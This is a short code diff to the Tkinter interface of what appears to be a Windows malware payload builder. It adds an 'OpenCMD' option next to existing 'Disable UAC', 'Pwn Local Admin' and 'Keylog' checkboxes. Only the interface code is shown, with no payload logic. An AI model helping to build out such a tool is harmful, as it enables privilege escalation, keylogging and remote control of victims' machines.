@@ -80,11 +80,13 @@ includeUACdowngrade = IntVar()
 includeUACdisable = IntVar()
 includePWNadmin = IntVar()
 includeKeylog = IntVar()
+includeOpenCMD = IntVar()
 
 downgradeUAC = Checkbutton(poisonOptions,text="Downgrade UAC",bg='#888888',variable=includeUACdowngrade)
 disableUAC = Checkbutton(poisonOptions,text="Disable UAC",bg='#888888',variable=includeUACdisable)
 pwnadmin = Checkbutton(poisonOptions,text="Pwn Local Admin",bg='#888888',variable=includePWNadmin)
 keylog = Checkbutton(poisonOptions,text="Keylog",bg='#888888',variable=includeKeylog)
+OpenCMD = Checkbutton(poisonOptions,text="OpenCMD",bg='#888888',variable=includeOpenCMD)
 
 uploadfile = Button(uploader,text="Upload file",command=lambda : Methods.Upload(),borderwidth=5)
 create = Button(poisonOptions,text="Create",command=lambda : Methods.Create(),borderwidth=5)
@@ -99,6 +101,7 @@ downgradeUAC.pack(anchor='nw')
 disableUAC.pack(anchor='nw')
 pwnadmin.pack(anchor='nw')
 keylog.pack(anchor='nw')
+OpenCMD.pack(anchor='nw')
 create.pack(anchor='nw')
 
 #Controller - Control local system, disable UAC, etc. from a pivot
